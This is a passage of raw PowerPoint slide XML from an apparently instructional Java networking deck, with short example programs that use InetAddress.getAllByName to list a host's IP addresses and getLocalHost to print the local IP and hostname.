            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>java.net.InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>MultipleIPs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>) throws Exception {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>[] addresses = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress.getAllByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>("google.com");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>        for (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> : addresses) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>addr.getHostAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>        }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="5486400"/>
            <a:ext cx="6096000" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Possible Output:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>142.250.190.46</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2607:f8b0:4009:80e::200e</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="266700"/>
            <a:ext cx="7775575" cy="762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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>method usage example</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>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066800" y="266700"/>
            <a:ext cx="7775575" cy="762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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>method usage example</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="1295400"/>
            <a:ext cx="11658599" cy="556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400" dirty="0"/>
              <a:t>The following code demonstrates the use of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>:</a:t>
            </a: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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Test: Remote host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>www.126.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Running results:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1998663" y="1828800"/>
            <a:ext cx="8305800" cy="28003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a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.net.*;</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>MyInetAddress3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>main(String[] args) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Exception{</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if (args.length == 0)</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return;</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String host = args[0];</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress addresses[] = InetAddress.getAllByName(host);</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for (InetAddress address : addresses)</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println(address);</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="33794"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28571"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3505200" y="5594631"/>
            <a:ext cx="4479925" cy="99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7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304800" y="1066800"/>
            <a:ext cx="11429999" cy="2209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800" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>getLocalHost to get the InetAddress object that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>describes the local </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>address . The definition of this method is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>public static InetAddress getLocalHost() throws UnknownHostException</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>The following code demonstrates how to use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getLocalHost </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>to get the local </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>and computer name.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="711201" y="3581400"/>
            <a:ext cx="8610600" cy="2585323"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>java.net.InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>LocalIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>    public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>) throws Exception {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> localhost = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>InetAddress.getLocalHost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>("Local IP: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>localhost.getHostAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>("Local Hostname: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>localhost.getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="419099" y="304800"/>
            <a:ext cx="11201399" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>3. getLocalHost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
